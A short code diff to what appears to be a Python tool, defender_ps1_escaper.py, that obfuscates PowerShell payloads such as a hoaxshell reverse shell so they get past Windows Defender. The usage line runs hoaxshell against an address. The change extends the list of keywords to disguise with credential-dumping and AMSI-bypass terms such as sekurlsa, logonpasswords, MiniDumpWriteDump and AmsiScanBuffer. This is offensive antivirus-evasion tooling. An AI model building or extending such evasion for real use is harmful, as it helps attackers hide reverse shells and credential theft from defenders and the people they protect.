@@ -11,7 +11,7 @@ python hoaxshell.py -s 1.2.3.4 -r -o
 python defender_ps1_escaper.py -f hoaxshell.ps1 -o hoaxshell_escaped.ps1
 """
 
-DEFAULT_WORDS="IEX,Invoke,DownloadString"
+DEFAULT_WORDS="IEX,Invoke,DownloadString,FromBase64String,MiniDumpWriteDump,ReadProcessMemory,sekurlsa,logonpasswords,AmsiScanBuffer,System.Net.WebClient"
 
 def insert_quotes(arg1: str) -> str:
     n = len(arg1)
